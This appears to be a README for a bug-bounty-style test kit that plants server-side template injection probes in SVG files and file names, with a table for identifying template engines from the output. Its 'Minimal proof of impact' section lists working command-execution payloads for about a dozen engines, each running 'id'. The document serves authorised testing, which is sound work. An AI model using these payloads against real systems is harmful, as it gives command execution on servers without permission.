# SSTI via SVG

SVG text, metadata and file names sometimes end up inside a server-side template: an HTML email, a PDF report, an admin moderation view, a caption on a generated preview. These files plant probes in every place such content tends to be reflected. The `ssti1`...`ssti10` and `ssti-t/d/m` markers let you grep for the evaluated result.

## Files

- `01-detect-text.svg`: ten probes in `<text>`. `<%= %>` is wrapped in CDATA so the file stays well-formed XML.
- `02-detect-title-desc-metadata.svg`: probes in `title`, `desc`, `metadata`.
- `03-detect-attributes.svg`: `id`, `class`, `data-*`, `aria-label`, `xlink:title`. (`<` is illegal in XML attributes, so ERB/EJS-style tags are not used here.)
- `04-detect-comment-and-pi.svg`: comment and processing instruction.
- `05-polyglot.svg`: the generic detection polyglot (`${{<%[%'"}}%\.`). Any error, stack trace or odd rendering suggests a template engine.

File names count too. Upload copies named `{{7*7}}.svg` and `${7*7}.svg`, and try `filename*=UTF-8''...` in the multipart header.

## Reading results

An evaluated probe shows `49` (or `7777777` for `7*'7'` in Jinja2) between the markers, for example `ssti149ssti1`.

| Probe | Output `49` points to |
|---|---|
| `{{7*7}}` | Jinja2, Twig, Nunjucks, Tornado |
| `{{7*'7'}}` | `7777777` = Jinja2, `49` = Twig or Nunjucks |
| `${7*7}` | Freemarker, Velocity, Mako, JSP/Java EL, Spring |
| `<%= 7*7 %>` | ERB, EJS |
| `#{7*7}` | Pug, Thymeleaf-style, Ruby (inside double-quoted strings) |
| `*{7*7}` or `[[${7*7}]]` | Thymeleaf |
| `@(7*7)` | Razor |
| `{7*7}` | Smarty |

The table is a starting point. Confirm the engine with a second probe before going further.

## Minimal proof of impact

Once an engine is confirmed, `id` or `whoami` output is enough for a report. Stop there.

```
Jinja2:     {{ cycler.__init__.__globals__.os.popen('id').read() }}
Twig:       {{['id']|filter('system')}}
Smarty:     {system('id')}
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
Spring/EL:  ${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}
ERB:        <%= `id` %>
EJS:        <%= global.process.mainModule.require('child_process').execSync('id') %>
Pug:        #{global.process.mainModule.require('child_process').execSync('id')}
Nunjucks:   {{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
Mako:       ${__import__('os').popen('id').read()}
Tornado:    {% import os %}{{os.popen('id').read()}}
```

These are public, widely documented proofs. Many modern configurations are sandboxed, so a failed proof does not mean the probe was not evaluated. Report the arithmetic result if that is all you can show.

## Blind cases

If the result is shown to someone else (admin panel, nightly report), use engine-specific out-of-band or time-based proofs. Keep them minimal and inside program rules.
